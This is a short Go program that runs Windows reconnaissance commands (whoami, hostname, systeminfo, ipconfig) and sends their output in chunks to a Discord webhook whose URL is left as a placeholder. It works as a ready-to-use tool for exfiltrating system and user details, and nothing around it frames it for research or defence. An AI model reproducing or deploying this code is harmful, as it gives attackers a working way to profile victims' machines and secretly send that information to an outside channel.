package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

type DiscordMessage struct {
	Content string `json:"content"` //the message content needs to be in JSON format
}

func runCommand(cmd string) (string, error) {
	var out bytes.Buffer
	command := exec.Command("cmd", "/C", cmd) //this is for Windows, for Linux use exec.Command("bash", "-c", cmd)
	command.Stdout = &out
	err := command.Run()
	if err != nil {
		return "", err
	}
	return out.String(), nil
}

func sendToDiscord(webhookURL string, message string) error {
	msg := DiscordMessage{Content: message}
	payload, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", webhookURL, bytes.NewReader(payload))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json") //this is required for Discord to accept the payload

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to send message to Discord, status code: %d", resp.StatusCode)
	}
	return nil
}

func main() {
	webhookURL := "<ENTERWEBHOOKURL>" //this is where your webhook URL goes

	commands := []string{"whoami", "hostname", "systeminfo", "ipconfig"}

	for _, cmd := range commands {
		output, err := runCommand(cmd)
		if err != nil {
			log.Fatalf("Error running command %s: %v", cmd, err)
		}

		lines := strings.Split(output, "\n") //this splits the output into chunks to avoid exceeding payload size limit
		chunk := ""
		for _, line := range lines {
			if len(chunk)+len(line) > 1800 { //the Discord message character limit
				if err := sendToDiscord(webhookURL, chunk); err != nil {
					log.Fatalf("Error sending to Discord: %v", err)
				}
				chunk = line
			} else {
				chunk += "\n" + line
			}
		}
		if chunk != "" {
			if err := sendToDiscord(webhookURL, chunk); err != nil {
				log.Fatalf("Error sending to Discord: %v", err)
			}
		}
	}

	fmt.Println("Information sent to Discord successfully.")
}
